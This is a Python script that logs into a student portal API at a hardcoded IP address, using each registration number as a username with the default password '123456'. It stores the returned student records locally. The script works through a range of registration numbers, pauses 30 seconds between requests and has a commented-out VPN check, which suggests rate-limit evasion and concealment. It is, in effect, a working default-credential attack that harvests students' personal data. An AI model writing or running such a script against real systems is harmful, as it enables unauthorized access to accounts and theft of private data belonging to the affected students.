from tinydb import TinyDB, Query
from vpn_connected import is_connected_to_vpn
from my_ip import print_my_ip
import requests as req
import json
from time import sleep

SERVER_ADDRESS = "http://103.113.200.45:8006/api/student/login"
DB_FILE_PATH = "./db/ov.regs.json"


db = TinyDB(DB_FILE_PATH)
Student = Query()


def get_reg_data(reg: int):
    form_data = {
        "username": str(reg),
        "password": "123456",
        "recaptcha-v3": "undefined"
    }
    res = req.post(SERVER_ADDRESS, data=form_data,timeout=3600)
    res.raise_for_status()
    return json.dumps(res.json())


def main():
    student_table = db.table("students")
    students = student_table.search(
        (Student.reg >= 22237000000) & (Student.collected == False))

    print("Total student", students.__len__())

    for student in students:
        reg = student["reg"]

        # if not is_connected_to_vpn():
        #     raise Exception("VPN not connected!")

        if not student["data"]:
            student_data = get_reg_data(reg)
            id = student_table.update(
                {"data": student_data, "collected": True}, Student.reg == reg)
            print(reg, "Collected. Id - ", id[0])
        else:
            print(reg, "Exist.")
            continue
        # break
        sleep(30)


def test():
    print(is_connected_to_vpn())


if __name__ == "__main__":
    try:
        print_my_ip()
        main()
        # test()
    except KeyboardInterrupt:
        exit()
    except Exception as err:
        print(err)
        print("Error.")
        exit()
